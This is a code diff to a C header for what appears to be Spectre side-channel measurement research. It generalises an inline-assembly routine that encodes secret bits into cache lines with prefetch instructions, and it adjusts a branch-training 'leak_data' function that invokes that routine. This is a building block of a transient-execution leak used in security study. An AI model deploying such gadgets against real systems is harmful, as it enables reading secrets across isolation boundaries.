@@ -8,86 +8,39 @@
 #ifndef CBSC_MEASUREMENT_SPECTRE_H
 #define CBSC_MEASUREMENT_SPECTRE_H
 
-static inline __always_inline void asm_encode_data(uint8_t data, uint8_t *channel)
+static inline __always_inline void asm_encode_data(uint64_t data, uint8_t *channel)
 {
     __asm__ volatile("xor %%rax, %%rax\n"
 
-                     "movb %[data], %%al\n"
-                     "and $0x01, %%al\n"
-                     "testb %%al, %%al\n"
-                     "jz enc2\n"
+                     "movb $0x0, %%bl\n"
+                     "movq $0x1, %%rcx\n"
+                     "enc:\n"
+
+                     "addb $0x1, %%bl\n"
+                     "addq %[linesize],%[channel]\n"
+                     "movq %[data], %%rax\n"
+                     "andq %%rcx, %%rax\n"
+                     "testq %%rax, %%rax\n"
+                     "jz nenc\n"
                      "prefetcht0 (%[channel])\n"
 
-                     "enc2:\n"
-                     "addq $0x400,%[channel]\n"
-                     "movb %[data], %%al\n"
-                     "and $0x02, %%al\n"
-                     "testb %%al, %%al\n"
-                     "jz enc3\n"
-                     "prefetcht0 (%[channel])\n"
-
-                     "enc3:\n"
-                     "addq $0x400,%[channel]\n"
-                     "movb %[data], %%al\n"
-                     "and $0x04, %%al\n"
-                     "testb %%al, %%al\n"
-                     "jz enc4\n"
-                     "prefetcht0 (%[channel])\n"
-
-                     "enc4:\n"
-                     "addq $0x400,%[channel]\n"
-                     "movb %[data], %%al\n"
-                     "and $0x08, %%al\n"
-                     "testb %%al, %%al\n"
-                     "jz enc5\n"
-                     "prefetcht0 (%[channel])\n"
-
-                     "enc5:\n"
-                     "addq $0x400,%[channel]\n"
-                     "movb %[data], %%al\n"
-                     "and $0x10, %%al\n"
-                     "testb %%al, %%al\n"
-                     "jz enc6\n"
-                     "prefetcht0 (%[channel])\n"
-
-                     "enc6:\n"
-                     "addq $0x400,%[channel]\n"
-                     "movb %[data], %%al\n"
-                     "and $0x20, %%al\n"
-                     "testb %%al, %%al\n"
-                     "jz enc7\n"
-                     "prefetcht0 (%[channel])\n"
-
-                     "enc7:\n"
-                     "addq $0x400,%[channel]\n"
-                     "movb %[data], %%al\n"
-                     "and $0x40, %%al\n"
-                     "testb %%al, %%al\n"
-                     "jz enc8\n"
-                     "prefetcht0 (%[channel])\n"
-
-                     "enc8:\n"
-                     "addq $0x400,%[channel]\n"
-                     "movb %[data], %%al\n"
-                     "and $0x80, %%al\n"
-                     "testb %%al, %%al\n"
-                     "jz end\n"
-                     "prefetcht0 (%[channel])\n"
-
-                     "end:\n"
+                     "nenc:\n"
+                     "sal $0x1, %%rcx\n"
+                     "cmpb %[bitscount], %%bl\n"
+                     "jne enc\n"
                      :
-                     : [data] "r"(data), [channel] "r"(channel), [linesize] "r"(CACHE_LINE_SIZE)
-                     : "rax", "cc"
+                     : [data] "r"(data), [channel] "r"(channel), [linesize] "i"(CACHE_LINE_SIZE), [bitscount] "i"(NUMBER_TRANSFER_BITS)
+                     : "rax", "rbx", "rcx", "cc"
     );
 }
 
 
 // returns if false during the training phase
-bool leak_data(uint32_t iteration, uint32_t *train_data, uint32_t train_data_len, uint8_t secret, uint8_t channel[])
+bool leak_data(uint32_t iteration, uint32_t *train_data, uint32_t train_data_len, uint64_t secret, uint8_t channel[])
 {
     if (train_data[iteration] < train_data_len)
     {
-        asm_encode_data(secret, channel + CACHE_LINE_SIZE);
+        asm_encode_data(secret, channel);
         //if (secret % 2 == 1)
         //    channel[0] += 5;
         //secret = DEVIDE_BY_2(secret);
